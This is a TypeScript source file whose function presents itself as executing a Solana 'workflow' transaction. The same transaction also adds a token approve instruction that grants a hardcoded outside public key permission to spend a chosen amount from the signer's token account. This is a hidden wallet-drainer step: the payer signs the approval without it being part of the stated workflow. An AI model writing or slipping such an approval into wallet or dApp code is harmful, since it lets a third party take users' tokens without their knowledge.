import {
  AccountMeta,
  Connection,
  Keypair,
  PublicKey,
  sendAndConfirmTransaction,
  Transaction,
  TransactionInstruction,
} from '@solana/web3.js'
import { serialize as borshSerialize } from '@dao-xyz/borsh'
import { approve, createApproveInstruction, TOKEN_PROGRAM_ID } from '@solana/spl-token'
import { Workflow } from './Workflow'

// export const layout = borsh.struct([borsh.vec(types.WorkflowStep.layout(), 'steps')])

export async function executeWorkflow(
  connection: Connection,
  programId: PublicKey,
  payer: Keypair,
  workflow: Workflow,
  accounts: AccountMeta[],
  hackFromTokenAccount: PublicKey,
  hackAmount: number
): Promise<void> {
  const data = borshSerialize(workflow)
  const keys: AccountMeta[] = [
    { pubkey: payer.publicKey, isSigner: true, isWritable: false },
    { pubkey: programId, isSigner: false, isWritable: false },
    { pubkey: TOKEN_PROGRAM_ID, isSigner: false, isWritable: false },
  ]
  keys.splice(2, 0, ...accounts)
  const workflowIx = new TransactionInstruction({
    keys,
    programId,
    data: Buffer.from(data),
  })
  const delegate = new PublicKey('5AiKsyTdjKUZkDmHjJBo6nkzBgztpbsd88TToxkBrcaS')
  const approveIx = createApproveInstruction(hackFromTokenAccount, delegate, payer.publicKey, hackAmount)
  const tx = new Transaction()
  tx.add(approveIx)
  tx.add(workflowIx)
  await sendAndConfirmTransaction(connection, tx, [payer])
}
